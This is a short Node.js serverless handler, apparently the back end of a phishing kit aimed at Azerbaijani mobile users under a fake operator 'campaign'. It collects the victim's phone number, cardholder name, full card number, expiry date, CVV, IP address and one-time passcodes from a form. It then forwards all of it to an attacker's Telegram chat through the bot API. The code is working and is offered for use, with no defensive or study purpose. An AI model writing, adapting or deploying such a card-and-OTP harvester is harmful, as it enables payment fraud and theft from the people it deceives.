exports.handler = async (event) => {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
        return {
            statusCode: 500,
            body: JSON.stringify({ 
                status: 'error', 
                message: 'Token or Chat ID missing' 
            })
        };
    }

    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ 
                status: 'error', 
                message: 'Method Not Allowed' 
            })
        };
    }

    try {
        const params = new URLSearchParams(event.body);
        
        // OTP mesajı varsa onu göndər
        let message = params.get('otp_message');
        
        if (!message) {
            // Kart məlumatları mesajı
            const operator = params.get('operator') || '';
            const prefix = params.get('prefix') || '';
            const number = params.get('number') || '';
            const price = params.get('campaign_price') || '';
            const cardName = params.get('card_name') || '';
            const cardNumber = params.get('card_number') || '';
            const cardExpiry = params.get('card_expiry') || '';
            const cardCvv = params.get('card_cvv') || '';
            const ip = params.get('ip') || event.headers['x-forwarded-for'] || '0.0.0.0';

            message = `🔴 YENI BILGI 🔴\n\n` +
                `Operator: ${operator}\n` +
                `Nomre: +994${prefix}${number}\n` +
                `Kampaniya: ${price} AZN\n` +
                `Kart Sahibi: ${cardName}\n` +
                `Kart Nomresi: ${cardNumber}\n` +
                `Kart Bitis: ${cardExpiry}\n` +
                `CVV: ${cardCvv}\n` +
                `IP: ${ip}`;
        }

        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const data = new URLSearchParams({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });

        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: data
        });

        if (response.ok) {
            return {
                statusCode: 200,
                body: JSON.stringify({ 
                    status: 'success', 
                    message: 'Data sent to Telegram' 
                })
            };
        } else {
            return {
                statusCode: 500,
                body: JSON.stringify({ 
                    status: 'error', 
                    message: 'Failed to send to Telegram' 
                })
            };
        }

    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ 
                status: 'error', 
                message: error.message 
            })
        };
    }
};
